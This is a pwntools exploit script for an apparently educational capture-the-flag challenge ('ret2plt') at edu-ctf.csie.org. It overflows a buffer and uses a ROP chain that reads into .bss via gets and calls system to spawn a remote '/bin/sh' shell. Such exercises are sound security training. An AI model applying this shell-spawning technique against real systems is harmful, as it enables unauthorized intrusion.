from pwn import *

context.arch = 'amd64'

# p = process('./ret2plt')
p = remote('edu-ctf.csie.org', 10174)

system_plt = 0x400520
gets_plt = 0x400530

bss = 0x601040  # by readelf -S ./ret2plt
# [24] .bss              NOBITS           0000000000601040  00001040
#      0000000000000030  0000000000000000  WA       0     0     32

pop_rdi = 0x400733


chain = b''
chain += p64(pop_rdi)
chain += p64(bss)
chain += p64(gets_plt)

chain += p64(pop_rdi)
chain += p64(bss)
chain += p64(system_plt)

p.sendline(b'A' * 0x38 + chain)
p.sendline('/bin/sh')

p.interactive()
